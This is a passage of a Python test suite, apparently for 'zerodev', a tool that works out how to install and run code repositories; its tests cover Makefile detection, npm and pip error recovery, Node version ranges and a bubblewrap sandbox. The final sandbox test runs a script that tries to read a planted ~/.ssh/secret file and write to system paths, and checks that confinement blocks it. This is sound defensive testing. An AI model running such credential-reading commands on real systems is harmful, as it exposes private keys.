        self.addCleanup(d.cleanup)
        r = Path(d.name)
        (r / "Makefile").write_text(makefile)
        return r

    def test_run_target_found(self):
        r = self._repo("build:\n\tgo build\n\nrun:\n\t./app --port 8000\n")
        self.assertEqual(plan.makefile_run(r), ("make run", "run"))

    def test_preference_order_and_phony(self):
        r = self._repo(".PHONY: dev start\nstart:\n\tnode a.js\ndev:\n\tnode b.js --watch\n")
        self.assertEqual(plan.makefile_run(r), ("make dev", "dev"))

    def test_echo_only_target_is_ignored(self):
        r = self._repo("run:\n\t@echo \"use docker\"\n\nserve:\n\t@echo hi\n")
        self.assertIsNone(plan.makefile_run(r))

    def test_target_with_prerequisites_counts(self):
        r = self._repo("run: build\nbuild:\n\tcc x.c\n")
        self.assertEqual(plan.makefile_run(r), ("make run", "run"))

    def test_no_makefile_or_no_target(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertIsNone(plan.makefile_run(Path(d)))
        self.assertIsNone(self._makefile_without_target())

    def _makefile_without_target(self):
        return plan.makefile_run(self._repo("all:\n\tcc x.c\nclean:\n\trm x\n"))

    def test_make_plan_uses_it_only_as_last_resort(self):
        r = self._repo("run:\n\tpython serve.py\n")
        (r / "serve.py").write_text("print(1)\n")
        (r / "requirements.txt").write_text("flask\n")
        ctx = core.make_plan(r)
        self.assertTrue(ctx.plan.run)                 # serve.py ou make run : une commande existe
        r2 = self._repo("run:\n\tmake something\n")
        (r2 / "package.json").write_text(json.dumps({"scripts": {"start": "node x.js"}}))
        self.assertEqual(core.make_plan(r2).plan.run, "npm run start")   # la détection normale gagne


class TestBenchStreaming(unittest.TestCase):
    def test_detection_only_deletes_url_clones_but_keeps_local_dirs(self):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d:
            work = Path(d) / "w"
            work.mkdir()
            local = Path(d) / "local"
            local.mkdir()
            (local / "package.json").write_text(json.dumps({"scripts": {"start": "node x.js"}}))
            clone = work / "o__r"

            def fake(entry, wd):
                if entry.startswith("http"):
                    clone.mkdir()
                    (clone / "package.json").write_text(json.dumps({"scripts": {"start": "node x.js"}}))
                    return clone, 0.1, None
                return Path(entry), 0.0, None
            with mock.patch.object(bench, "_materialize", side_effect=fake):
                rows = [bench._detect_and_clean(e, work) for e in ("https://github.com/o/r", str(local))]
            self.assertTrue(all(r["detected"] for r in rows))
            self.assertFalse(clone.exists())          # clone supprimé
            self.assertTrue(local.exists())           # dossier local intact


class TestSafeGlob(unittest.TestCase):
    def test_odd_patterns_do_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "a").mkdir()
            self.assertEqual(plan.safe_glob(r, "."), [r])
            self.assertEqual(plan.safe_glob(r, ""), [r])
            self.assertEqual(plan.safe_glob(r, "./a"), [r / "a"])
            self.assertEqual(plan.safe_glob(r, "/etc/*"), [])
            self.assertEqual(plan.safe_glob(r, "a/**/x"), [])

    def test_cargo_workspace_with_dot_member(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "Cargo.toml").write_text('[package]\nname="x"\nversion="0.1.0"\n[workspace]\nmembers=["."]\n')
            (r / "src").mkdir()
            (r / "src" / "main.rs").write_text("fn main(){}\n")
            self.assertEqual(plan._members(r, plan.toml(r, "Cargo.toml")), [r])

    def test_classify_never_raises(self):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d, mock.patch.object(bench, "make_plan", side_effect=IndexError("x")):
            self.assertEqual(bench.classify(Path(d), None)["status"], "detector_error")


class TestSummaryInferred(unittest.TestCase):
    def test_makefile_guesses_are_reported_separately(self):
        rows = [{"repo": "a", "status": "runnable", "detected": True, "lang": "go", "run_inferred": True},
                {"repo": "b", "status": "runnable", "detected": True, "lang": "go"},
                {"repo": "c", "status": "no_run_command", "detected": False, "lang": "go"},
                {"repo": "d", "status": "clone_failed", "detected": False}]
        s = bench.summarize(rows, False)
        self.assertEqual(s["inferred_from_makefile"], 1)
        self.assertEqual(s["detection_rate_of_cloned"], 0.667)
        self.assertEqual(s["detection_rate_strict_of_cloned"], 0.333)


class TestBenchCheckpoint(unittest.TestCase):
    def test_partial_report_is_written_per_repo(self):
        with tempfile.TemporaryDirectory() as d:
            out = Path(d) / "r.json"
            rows = [{"repo": "a", "status": "runnable", "detected": True, "lang": "node"}]
            bench._checkpoint(out, rows, False)
            data = json.loads(out.read_text())
            self.assertTrue(data["partial"])
            self.assertEqual(data["summary"]["detected"], 1)


class TestAbiCap(unittest.TestCase):
    TAIL = ("hint: `opensim` was found on https://pypi.org/simple, but not at the requested version. "
            "opensim (v4.6) only has wheels for the following Python ABI tags: `cp311`, `cp312`, `cp313`")

    def test_cap_found(self):
        self.assertEqual(recovery.abi_cap(self.TAIL), 13)
        self.assertIsNone(recovery.abi_cap("error: nothing about abi"))

    def test_downgrade_to_highest_supported_minor(self):
        p = plan.Plan("python", None, "x", [], "x")                 # version inconnue = la plus récente
        self.assertEqual(recovery.diagnose_python_install(p, self.TAIL), "3.13")

    def test_constraint_version_uses_interpreter_cited_by_uv(self):
        p = plan.Plan("python", ">=3.11", "x", [], "x")             # contrainte, pas la version réelle
        tail = "hint: You require CPython 3.14 (`cp314`), but we only found wheels for\n" + self.TAIL
        self.assertEqual(recovery.diagnose_python_install(p, tail), "3.13")

    def test_no_downgrade_when_already_within_cap(self):
        p = plan.Plan("python", "3.12", "x", [], "x")
        self.assertIsNone(recovery.diagnose_python_install(p, self.TAIL))


class TestBenchPhases(unittest.TestCase):
    def test_cli_help_pattern(self):
        for text in ("Usage: citgm [options]", "subcommands:\n  {a,b}", "Run `x --help` to print help",
                     "[dario] TUI requires an interactive terminal."):
            self.assertTrue(bench.CLI_HELP.search(text), text)
        self.assertFalse(bench.CLI_HELP.search("Listening on http://0.0.0.0:8000"))

    def test_summary_counts_phases(self):
        rows = [{"repo": "a", "status": "runnable", "detected": True, "lang": "node", "phase": "install_timeout"},
                {"repo": "b", "status": "runnable", "detected": True, "lang": "node", "phase": "run", "cli_tool": True}]
        s = bench.summarize(rows, True)
        self.assertEqual((s["install_timeout"], s["cli_tools"]), (1, 1))


class TestNpmCiFallback(unittest.TestCase):
    OUT_OF_SYNC = ("npm error `npm ci` can only install packages when your package.json and package-lock.json "
                   "are in sync.\nnpm error Missing: left-pad@1.3.0 from lock file")
    PEER = "npm error code ERESOLVE\nnpm error Could not resolve dependency:\nnpm error peer react@\"^17\""

    def test_out_of_sync_lockfile_uses_npm_install(self):
        self.assertEqual(recovery.diagnose_npm_ci("npm ci", self.OUT_OF_SYNC), "npm install")

    def test_peer_conflict_uses_legacy_peer_deps(self):
        self.assertEqual(recovery.diagnose_npm_ci("npm ci", self.PEER), "npm install --legacy-peer-deps")

    def test_other_steps_and_unrelated_errors_are_left_alone(self):
        self.assertIsNone(recovery.diagnose_npm_ci("pnpm install --frozen-lockfile", self.OUT_OF_SYNC))
        self.assertIsNone(recovery.diagnose_npm_ci("npm ci", "npm error network timeout"))


class TestEnsureDisk(unittest.TestCase):
    def test_enough_space_does_nothing(self):
        self.assertTrue(bench.ensure_disk(min_mb=1))

    def test_impossible_threshold_returns_false_after_cleanup(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["ZERO_HOME"] = d
            self.addCleanup(os.environ.pop, "ZERO_HOME", None)
            (Path(d) / "envs").mkdir()
            self.assertFalse(bench.ensure_disk(min_mb=10 ** 9))      # 1 To : jamais atteint
            self.assertFalse((Path(d) / "envs").exists())             # caches vidés


class TestIgnoreScriptsFallback(unittest.TestCase):
    NPM = ("npm error code 1\nnpm error path /tmp/x\nnpm error command failed\n"
           "npm error command sh -c node scripts/fetch-model.mjs\n")
    PNPM = " ELIFECYCLE  Command failed with exit code 1."

    def test_npm_postinstall_failure(self):
        self.assertEqual(recovery.diagnose_node_scripts("npm ci", self.NPM), "npm ci --ignore-scripts")
        self.assertEqual(recovery.diagnose_node_scripts("npm install", self.NPM), "npm install --ignore-scripts")

    def test_pnpm_lifecycle_failure(self):
        self.assertEqual(recovery.diagnose_node_scripts("pnpm install", self.PNPM), "pnpm install --ignore-scripts")

    def test_not_repeated_and_not_for_other_errors(self):
        self.assertIsNone(recovery.diagnose_node_scripts("npm ci --ignore-scripts", self.NPM))
        self.assertIsNone(recovery.diagnose_node_scripts("npm ci", "npm error network timeout"))
        self.assertIsNone(recovery.diagnose_node_scripts("cargo build", self.NPM))


class TestScmVersionFallback(unittest.TestCase):
    SHALLOW = 'UserWarning: "/tmp/x" is shallow and may cause errors\n  hatch_vcs ... LookupError'

    def test_shallow_clone_triggers_pretend_version(self):
        p = plan.Plan("python", None, "x", [], "x")
        env = recovery.diagnose_scm_version(p, self.SHALLOW)
        self.assertEqual(env["SETUPTOOLS_SCM_PRETEND_VERSION"], "0.0.0")
        self.assertTrue(recovery.diagnose_scm_version(p, "LookupError: setuptools-scm was unable to detect version"))

    def test_other_errors_and_languages_ignored(self):
        p = plan.Plan("python", None, "x", [], "x")
        self.assertIsNone(recovery.diagnose_scm_version(p, "error: could not compile foo.c"))
        n = plan.Plan("node", None, "x", [], "x")
        self.assertIsNone(recovery.diagnose_scm_version(n, self.SHALLOW))


class TestNodeRanges(unittest.TestCase):
    def test_satisfies(self):
        from zerodev.runtimes import node_satisfies as ok
        self.assertTrue(ok("v22.11.0", ">=20.0.0"))
        self.assertFalse(ok("v18.20.0", ">=20"))
        self.assertTrue(ok("v20.19.0", "^20.1"))
        self.assertFalse(ok("v22.1.0", "^20.1"))
        self.assertTrue(ok("v20.11.5", "~20.11.0"))
        self.assertFalse(ok("v20.12.0", "~20.11.0"))
        self.assertTrue(ok("v20.5.1", "20"))
        self.assertTrue(ok("v20.5.1", "20.x"))
        self.assertTrue(ok("v20.11.0", "20.11.0"))
        self.assertFalse(ok("v20.11.1", "20.11.0"))
        self.assertTrue(ok("v18.2.0", "^16 || ^18 || >=22"))
        self.assertFalse(ok("v20.2.0", "^16 || ^18 || >=22"))
        self.assertTrue(ok("v22.0.0", ">=18 <23"))
        self.assertFalse(ok("v23.0.0", ">=18 <23"))
        self.assertTrue(ok("v24.0.0", "*"))

    def test_offline_major_pick(self):
        from zerodev.runtimes import pick_node_major as pick
        self.assertEqual(pick(">=20.0.0"), "24")
        self.assertEqual(pick(">=18 <23"), "22")
        self.assertEqual(pick("^20.1"), "20")
        self.assertEqual(pick("^16 || ^18"), "18")
        self.assertIsNone(pick("lts/*"))
        self.assertIsNone(pick(None))

    def test_resolve_picks_newest_lts_not_lower_bound(self):
        from unittest import mock
        from zerodev import runtimes
        idx = json.dumps([{"version": "v25.1.0", "lts": False}, {"version": "v24.9.0", "lts": "Krypton"},
                          {"version": "v22.20.0", "lts": "Jod"}, {"version": "v20.19.5", "lts": "Iron"}])
        with mock.patch.object(runtimes, "fetch", return_value=idx):
            self.assertEqual(runtimes.resolve_node(">=20.0.0"), "v24.9.0")
            self.assertEqual(runtimes.resolve_node("20"), "v20.19.5")
            self.assertEqual(runtimes.resolve_node("^22.1"), "v22.20.0")
            self.assertEqual(runtimes.resolve_node("v20.19.5"), "v20.19.5")
            self.assertEqual(runtimes.resolve_node("lts/*"), "v24.9.0")


class TestOptionalAndBun(unittest.TestCase):
    def test_bun_install_script_failure_gets_ignore_scripts(self):
        tail = 'error: install script from "better-sqlite3" exited with 1'
        self.assertEqual(recovery.diagnose_node_scripts("bun install", tail), "bun install --ignore-scripts")

    def test_collectstatic_is_optional_for_django(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "manage.py").write_text("")
            (r / "requirements.txt").write_text("django\n")
            (r / "proj").mkdir()
            (r / "proj" / "settings.py").write_text("STATIC_ROOT = 'static'\n")
            p = plan.detect_python(r)
            cs = [s for s in p.install if "collectstatic" in s]
            self.assertEqual(len(cs), 1)
            self.assertEqual(p.optional_steps, cs)

    def test_optional_step_failure_does_not_abort_install(self):
        from unittest import mock
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            pl = plan.Plan("python", None, "x", ["true", "false"], "x", optional_steps=["false"])
            ctx = core.Context(root=r, plan=pl, services=[], gpu={}, fp="x", name="")
            with mock.patch.object(core, "warn") as w:
                env = core.install_deps(ctx, dict(os.environ), True)
            self.assertIsInstance(env, dict)
            w.assert_called()


class TestDiskFailure(unittest.TestCase):
    def test_enospc_is_a_disk_failure(self):
        self.assertTrue(bench.disk_failure({"phase": "install_failed", "tail": "npm warn tar ENOSPC: no space left"}))
        self.assertTrue(bench.disk_failure({"phase": "install_failed", "tail": "write error: No space left on device"}))

    def test_other_failures_and_phases_are_not(self):
        self.assertFalse(bench.disk_failure({"phase": "install_failed", "tail": "npm error code E404"}))
        self.assertFalse(bench.disk_failure({"phase": "run", "tail": "ENOSPC"}))
        self.assertFalse(bench.disk_failure({}))


class TestDiskFullClassification(unittest.TestCase):
    def test_sqlite_and_pnpm_messages_are_disk_failures(self):
        for t in ("SqliteError: database or disk is full", "mkdir ... ENOSPC: no space left on device",
                  "write error: No space left on device"):
            self.assertTrue(bench.disk_failure({"phase": "install_failed", "tail": t}), t)

    def test_summary_counts_disk_full(self):
        rows = [{"repo": "a", "status": "runnable", "detected": True, "lang": "node", "phase": "disk_full"},
                {"repo": "b", "status": "runnable", "detected": True, "lang": "node", "phase": "install_failed"}]
        self.assertEqual(bench.summarize(rows, True)["disk_full"], 1)


class TestDevEngines(unittest.TestCase):
    TAIL = ("npm error code EBADDEVENGINES\nnpm error EBADDEVENGINES Invalid devEngines.packageManager\n"
            "npm error EBADDEVENGINES {\nnpm error EBADDEVENGINES   current: { name: 'npm', version: '10.9.7' },\n"
            "npm error EBADDEVENGINES   required: { name: 'npm', version: '>=11.15.0', onFail: 'error' }\n"
            "npm error EBADDEVENGINES }")

    def test_required_npm_range_is_extracted(self):
        self.assertEqual(recovery.diagnose_dev_engines(self.TAIL), ">=11.15.0")

    def test_other_errors_ignored(self):
        self.assertIsNone(recovery.diagnose_dev_engines("npm error code E404"))


class TestNpmCiLockUnusable(unittest.TestCase):
    def test_remote_mirror_lockfile_installs_without_lock(self):
        tail = 'npm error code EALLOWREMOTE\nnpm error Refusing to fetch "zwitch@https://registry.npmmirror.com/zwitch/-/zwitch-2.0.4.tgz"'
        self.assertEqual(recovery.diagnose_npm_ci("npm ci", tail), "npm install --no-package-lock")

    def test_missing_locked_version_404(self):
        self.assertEqual(recovery.diagnose_npm_ci("npm ci", "npm error code E404\nnpm error 404 Not Found"),
                         "npm install --no-package-lock")

    def test_peer_conflict_still_has_priority(self):
        tail = "npm error code ERESOLVE\nnpm error 404"
        self.assertEqual(recovery.diagnose_npm_ci("npm ci", tail), "npm install --legacy-peer-deps")


class TestRequirementsVariants(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n in files:
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("torch\n")
        return r

    FILES = ["requirements/full/requirements.txt", "requirements/full/requirements_amd.txt",
             "requirements/full/requirements_apple_silicon.txt", "requirements/full/requirements_cpu_only.txt",
             "requirements/portable/requirements.txt", "requirements/portable/requirements_cpu_only.txt"]

    def test_choice_follows_hardware(self):
        from zerodev.gpu import pick_requirements_variant as pick
        r = self._repo(self.FILES)
        self.assertEqual(pick(r, {"vendor": "nvidia"})[0], "requirements/full/requirements.txt")
        self.assertEqual(pick(r, {"vendor": "amd"})[0], "requirements/full/requirements_amd.txt")
        self.assertEqual(pick(r, {"vendor": None})[0], "requirements/full/requirements_cpu_only.txt")

    def test_falls_back_to_base_without_cpu_variant(self):
        from zerodev.gpu import pick_requirements_variant as pick
        r = self._repo(["requirements/main/requirements.txt", "requirements/main/requirements_amd.txt"])
        self.assertEqual(pick(r, {"vendor": None})[0], "requirements/main/requirements.txt")

    def test_nothing_without_a_variant_layout(self):
        from zerodev.gpu import pick_requirements_variant as pick
        with tempfile.TemporaryDirectory() as d:
            self.assertIsNone(pick(Path(d), {"vendor": None}))
        self.assertIsNone(pick(self._repo(["requirements/base.txt"]), {"vendor": None}))

    def test_plan_uses_variant_and_notes_it(self):
        r = self._repo(self.FILES)
        (r / "server.py").write_text("print(1)\n")
        p = plan.detect_python(r)
        self.assertTrue(any("-r requirements/full/requirements_cpu_only.txt" in s for s in p.install))
        self.assertTrue(any("variantes de dépendances" in n for n in p.notes))
        self.assertIn("torch", p.ai_libs)


class TestFingerprintCoversRequirementsDir(unittest.TestCase):
    def test_variant_files_change_the_fingerprint(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            empty = freeze.fingerprint(r)
            (r / "requirements" / "full").mkdir(parents=True)
            (r / "requirements" / "full" / "requirements.txt").write_text("torch==2.0\n")
            a = freeze.fingerprint(r)
            self.assertNotEqual(a, empty)
            (r / "requirements" / "full" / "requirements_cpu_only.txt").write_text("torch==2.0+cpu\n")
            self.assertNotEqual(freeze.fingerprint(r), a)

    def test_fingerprint_is_stable(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "requirements").mkdir()
            (r / "requirements" / "base.txt").write_text("flask\n")
            self.assertEqual(freeze.fingerprint(r), freeze.fingerprint(r))


class TestScriptsWithoutManifest(unittest.TestCase):
    def _repo(self, files):
        d = tempfile.TemporaryDirectory()
        self.addCleanup(d.cleanup)
        r = Path(d.name)
        for n, c in files.items():
            f = r / n
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(c)
        return r

    def test_imports_exclude_stdlib_local_and_generic_names(self):
        r = self._repo({"main.py": "import os, json\nimport numpy as np\nimport cv2\nfrom helper import x\n"
                                   "import utils\nfrom model import GPT\nimport yaml\nfrom . import rel\n",
                        "helper.py": "x = 1\n", "model/__init__.py": ""})
        mods, scripts, py2 = plan.script_imports(r)
        self.assertEqual(mods, ["cv2", "numpy", "yaml"])
        self.assertEqual(len(scripts), 2)

    def test_single_main_guard_is_the_entry(self):
        r = self._repo({"run.py": "import flask\nif __name__ == '__main__':\n    print(1)\n", "lib2.py": "x=1\n"})
        p = plan.detect_scripts(r)
        self.assertEqual(p.run, "python run.py")
        self.assertIn("flask", p.install[-1])
        self.assertTrue(any("DÉDUITES" in n for n in p.notes))

    def test_import_map_and_torch_backend(self):
        r = self._repo({"train.py": "import torch\nimport cv2\nif __name__ == '__main__':\n    pass\n"})
        p = plan.detect_scripts(r)
        self.assertIn("opencv-python", p.install[-1])
        self.assertIn("--torch-backend=auto", p.install[-1])

    def test_several_scripts_without_guard_offer_choices(self):
        r = self._repo({"train.py": "import numpy\n", "sample.py": "import numpy\n", "model.py": "x=1\n",
                        "bench.py": "import model\n"})
        p = plan.detect_scripts(r)
        self.assertIsNone(p.run)
        self.assertEqual(sorted(p.choices), ["python bench.py", "python sample.py", "python train.py"])

    def test_resolve_project_uses_it_when_no_manifest(self):
        r = self._repo({"app.py": "import flask\nif __name__ == '__main__':\n    pass\n"})
        _, p = plan.resolve_project(r)
        self.assertEqual(p.run, "python app.py")


class TestFingerprintScriptsOnly(unittest.TestCase):
    def test_manifestless_repos_get_distinct_fingerprints(self):
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            (Path(a) / "train.py").write_text("import torch\n")
            (Path(b) / "train.py").write_text("import numpy\n")
            fa, fb = freeze.fingerprint(Path(a)), freeze.fingerprint(Path(b))
            self.assertNotEqual(fa, fb)
            self.assertNotEqual(fa, freeze.fingerprint(Path(tempfile.mkdtemp())))

    def test_manifest_present_means_scripts_are_not_hashed(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "requirements.txt").write_text("flask\n")
            (r / "app.py").write_text("v1\n")
            before = freeze.fingerprint(r)
            (r / "app.py").write_text("v2\n")
            self.assertEqual(freeze.fingerprint(r), before)       # le code source n'entre pas dans l'empreinte


class TestPython2Hint(unittest.TestCase):
    def test_signs_are_recognized(self):
        for tail in ("SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?",
                     "ModuleNotFoundError: No module named 'cPickle'", "ImportError: No module named urllib2"):
            self.assertIsNotNone(recovery.python2_hint(tail), tail)
        self.assertIn("Python 2", recovery.python2_hint("Missing parentheses in call to 'print'"))

    def test_ordinary_errors_are_not_python2(self):
        self.assertIsNone(recovery.python2_hint("ModuleNotFoundError: No module named 'flask'"))
        self.assertIsNone(recovery.python2_hint("Requires Python 3.9+"))
        self.assertIsNone(recovery.python2_hint(""))

    def test_py2_modules_are_not_installed_from_pypi(self):
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "a.py").write_text("import cPickle\nimport urllib2\nimport numpy\nif __name__=='__main__':\n    pass\n")
            mods, _, py2 = plan.script_imports(r)
            self.assertEqual(mods, ["numpy"])
            self.assertEqual(py2, ["cPickle", "urllib2"])
            p = plan.detect_scripts(r)
            self.assertNotIn("cPickle", p.install[-1])
            self.assertTrue(any("Python 2" in n for n in p.notes))


class TestDoctor(unittest.TestCase):
    def test_collect_without_network_has_expected_sections(self):
        from zerodev import doctor
        info = doctor.collect(network=False)
        for k in ("zerodev", "system", "disk", "tools", "containers", "local_services", "gpu"):
            self.assertIn(k, info)
        self.assertNotIn("network", info)
        self.assertEqual(info["zerodev"], core_version())
        self.assertGreaterEqual(info["disk"]["free_mb"], 0)

    def test_render_is_readable_and_mentions_missing_tools(self):
        from zerodev import doctor
        info = doctor.collect(network=False)
        info["tools"]["go"] = None
        info["network"] = {"github.com": True, "nodejs.org": False}
        text = doctor.render(info)
        self.assertIn(f"zerodev {core_version()}", text)
        self.assertIn("✗ go", text)
        self.assertIn("✓ github.com", text)
        self.assertIn("✗ nodejs.org", text)

    def test_go_uses_the_version_subcommand(self):
        from zerodev import doctor
        self.assertEqual(doctor.VERSION_CMDS["go"], ["go", "version"])

    def test_reachability_treats_http_errors_as_reachable_and_failures_as_not(self):
        import urllib.error
        from unittest import mock
        from zerodev import doctor
        err = urllib.error.HTTPError("u", 405, "x", {}, None)
        with mock.patch("urllib.request.urlopen", side_effect=err):
            self.assertTrue(doctor._reachable("http://x"))
        with mock.patch("urllib.request.urlopen", side_effect=OSError("down")):
            self.assertFalse(doctor._reachable("http://x"))

    def test_cli_doctor_json(self):
        import subprocess
        out = subprocess.run([sys.executable, "-m", "zerodev", "doctor", "--json", "--no-network"],
                             capture_output=True, text=True, env={**os.environ, "PYTHONPATH": str(ROOT / "src")})
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertEqual(json.loads(out.stdout)["zerodev"], core_version())


def core_version():
    from zerodev.util import VERSION
    return VERSION


class TestRunArgsAndCliHint(unittest.TestCase):
    def test_split_at_double_dash(self):
        from zerodev.cli import split_run_args as sp
        self.assertEqual(sp(["run", "repo", "--", "--port", "9"]), (["run", "repo"], ["--port", "9"]))
        self.assertEqual(sp(["run", "repo"]), (["run", "repo"], []))
        self.assertEqual(sp(["run", "--", "a", "--", "b"]), (["run"], ["a", "--", "b"]))

    def test_args_are_quoted_and_appended(self):
        pl = plan.Plan("python", None, "x", [], "python app.py")
        ctx = core.Context(root=Path("."), plan=pl, services=[], gpu={}, fp="x", name="")
        core.append_run_args(ctx, ["--name", "a b", "--flag"])
        self.assertEqual(ctx.plan.run, "python app.py --name 'a b' --flag")

    def test_npm_needs_a_double_dash_so_options_reach_the_script(self):
        for run, want in (("npm run start", "npm run start -- --a b"), ("npm start", "npm start -- --a b"),
                          ("npm run start -- --x", "npm run start -- --x --a b"), ("pnpm run start", "pnpm run start --a b"),
                          ("node index.js", "node index.js --a b")):
            ctx = core.Context(root=Path("."), plan=plan.Plan("node", None, "x", [], run), services=[], gpu={}, fp="x", name="")
            core.append_run_args(ctx, ["--a", "b"])
            self.assertEqual(ctx.plan.run, want, run)

    def test_args_refused_without_command_and_ignored_with_procfile(self):
        from unittest import mock
        none = core.Context(root=Path("."), plan=plan.Plan("python", None, "x", [], None), services=[], gpu={}, fp="x", name="")
        with self.assertRaises(ZeroError):
            core.append_run_args(none, ["x"])
        proc = core.Context(root=Path("."), plan=plan.Plan("python", None, "x", [], "x", processes={"web": "y"}),
                            services=[], gpu={}, fp="x", name="")
        with mock.patch.object(core, "warn") as w:
            core.append_run_args(proc, ["x"])
        w.assert_called()
        self.assertEqual(proc.plan.run, "x")

    def test_cli_tool_hint(self):
        self.assertIn("outil en ligne de commande", recovery.cli_tool_hint("Usage: tool [options]", 0.4))
        self.assertIsNone(recovery.cli_tool_hint("Usage: tool [options]", 30.0))      # resté vivant : pas un outil
        self.assertIsNone(recovery.cli_tool_hint("Listening on :8000", 0.4))

    def test_end_to_end_args_reach_the_program(self):
        import subprocess
        with tempfile.TemporaryDirectory() as d:
            r = Path(d)
            (r / "package.json").write_text(json.dumps({"scripts": {"start": "node t.js"}}))
            (r / "t.js").write_text("console.log('ARGS=' + process.argv.slice(2).join('|'))\n")
            out = subprocess.run([sys.executable, "-m", "zerodev", "run", "--no-services", "--no-lock", str(r), "--",
                                  "--name", "a b"], capture_output=True, text=True, timeout=120,
                                 env={**os.environ, "PYTHONPATH": str(ROOT / "src"), "ZERO_HOME": str(Path(d) / "zh")})
            self.assertIn("ARGS=--name|a b", out.stdout + out.stderr)      # npm : `--` inséré, sinon npm avale --name


class TestDistribution(unittest.TestCase):
    def test_zipapp_builds_and_runs_without_the_source_tree(self):
        import subprocess
        sys.path.insert(0, str(ROOT / "scripts"))
        try:
            import build_pyz
        finally:
            sys.path.pop(0)
        with tempfile.TemporaryDirectory() as d:
            pyz = build_pyz.build(Path(d) / "zero.pyz")
            self.assertTrue(pyz.exists())
            out = subprocess.run([sys.executable, str(pyz), "--version"], capture_output=True, text=True, cwd=d,
                                 env={k: v for k, v in os.environ.items() if k != "PYTHONPATH"})
            self.assertEqual(out.returncode, 0, out.stderr)
            self.assertIn(core_version(), out.stdout)

    def test_pyproject_takes_its_version_from_the_code(self):
        text = (ROOT / "pyproject.toml").read_text()
        self.assertIn('dynamic = ["version"]', text)
        self.assertIn("zerodev.util.VERSION", text)
        self.assertNotRegex(text, r'(?m)^version = "')

    def test_install_script_is_valid_shell_and_executable(self):
        import subprocess
        sh = ROOT / "install.sh"
        self.assertTrue(os.access(sh, os.X_OK))
        self.assertEqual(subprocess.run(["sh", "-n", str(sh)], capture_output=True).returncode, 0)


class TestSandbox(unittest.TestCase):
    def setUp(self):
        from zerodev import sandbox
        self.sb = sandbox
        self.addCleanup(sandbox.disable)

    def test_build_args_order_and_binds(self):
        with tempfile.TemporaryDirectory() as d:
            root, home, zh = Path(d, "proj"), Path(d, "home"), Path(d, "zh")
            root.mkdir(), home.mkdir()
            a = self.sb.build_args(root, home=home, zhome=zh)
            self.assertEqual(a[0], "bwrap")
            self.assertEqual(a[a.index("--ro-bind"):a.index("--ro-bind") + 3], ["--ro-bind", "/", "/"])
            tmpfs_home = a.index(str(home.resolve()))
            self.assertEqual(a[tmpfs_home - 1], "--tmpfs")                         # le dossier personnel est masqué
            # les montages en écriture viennent APRÈS les tmpfs (sinon ils seraient recouverts)
            binds = [i for i, x in enumerate(a) if x == "--bind"]
            self.assertTrue(all(i > tmpfs_home for i in binds))
            self.assertIn(str(root.resolve()), a)
            self.assertIn(str(zh.resolve()), a)
            for flag in ("--unshare-pid", "--unshare-ipc", "--die-with-parent"):
                self.assertIn(flag, a)
            self.assertNotIn("--unshare-net", a)                                  # le réseau n'est volontairement pas isolé
            self.assertIn("UV_CACHE_DIR", a)

    def test_wrap_quotes_the_command(self):
        with tempfile.TemporaryDirectory() as d:
            w = self.sb.wrap("echo 'a b' && ls", Path(d), home=Path(d, "h"), zhome=Path(d, "z"))
            self.assertTrue(w.startswith("bwrap "))
            self.assertTrue(w.endswith("sh -c " + __import__("shlex").quote("echo 'a b' && ls")))

    def test_maybe_wrap_is_identity_when_disabled(self):
        self.assertEqual(self.sb.maybe_wrap("echo hi"), "echo hi")

    def test_enable_refuses_without_bwrap_instead_of_running_unprotected(self):
        from unittest import mock
        with mock.patch.object(self.sb, "available", return_value=False):
            with self.assertRaises(ZeroError) as cm:
                self.sb.enable(Path("."))
            self.assertIn("bubblewrap", str(cm.exception))
        self.assertFalse(self.sb.enabled())

    @unittest.skipUnless(__import__("zerodev.sandbox", fromlist=["x"]).available(), "bubblewrap inutilisable ici")
    def test_real_confinement(self):
        import subprocess
        with tempfile.TemporaryDirectory() as d:
            root, home, zh = Path(d, "proj"), Path(d, "home"), Path(d, "zh")
            for x in (root, home / ".ssh"):
                x.mkdir(parents=True)
            (home / ".ssh" / "secret").write_text("SECRET")
            (Path(d) / "outside.txt").write_text("hors dépôt")
            outside = Path("/var/tmp") / f"ztsb_{os.getpid()}.txt"            # hors dépôt, hors /tmp : système en lecture seule
            self.addCleanup(lambda: outside.exists() and outside.unlink())
            script = ("echo ok > w.txt && echo WRITE_OK; "
                      f"(echo x > {outside} 2>/dev/null && echo OUTSIDE_WRITTEN) || echo OUTSIDE_REFUSED; "
                      f"echo p > /tmp/ztsb_private_{os.getpid()} && echo TMP_PRIVATE_OK; "
                      f"(cat {home}/.ssh/secret 2>/dev/null && echo SECRET_READ) || echo SECRET_HIDDEN; "
                      "(echo x > /usr/zt 2>/dev/null && echo USR_WRITTEN) || echo USR_REFUSED")
            self.sb.enable(root)
            cmd = self.sb.wrap(script, root, home=home, zhome=zh)
            out = subprocess.run(cmd, shell=True, cwd=root, capture_output=True, text=True, timeout=30)
            self.assertEqual(out.returncode, 0, out.stderr)
            for want in ("WRITE_OK", "OUTSIDE_REFUSED", "SECRET_HIDDEN", "USR_REFUSED"):
                self.assertIn(want, out.stdout)
            for bad in ("OUTSIDE_WRITTEN", "SECRET_READ", "USR_WRITTEN"):
                self.assertNotIn(bad, out.stdout)
            self.assertTrue((root / "w.txt").exists())
            self.assertFalse(outside.exists())
            self.assertIn("TMP_PRIVATE_OK", out.stdout)
